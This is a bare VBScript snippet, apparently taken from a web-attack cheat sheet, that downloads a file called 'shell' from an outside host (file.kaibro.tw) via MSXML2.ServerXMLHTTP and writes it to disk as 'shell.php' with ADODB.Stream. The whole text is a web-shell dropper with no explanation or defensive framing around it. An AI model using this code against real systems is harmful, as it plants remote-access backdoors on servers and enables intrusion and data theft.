Download "http://file.kaibro.tw/shell", "shell.php"
Function Download(strUrl, strFile)
Set xPost = CreateObject("MSXML2.ServerXMLHTTP")
xPost.Open "GET", strUrl,0
xPost.Send()
Set sGet = CreateObject("ADODB.Stream")
sGet.Mode = 3
sGet.Type = 1
sGet.Open()
sGet.Write(xPost.responseBody)
sGet.SaveToFile strFile,2
End Function
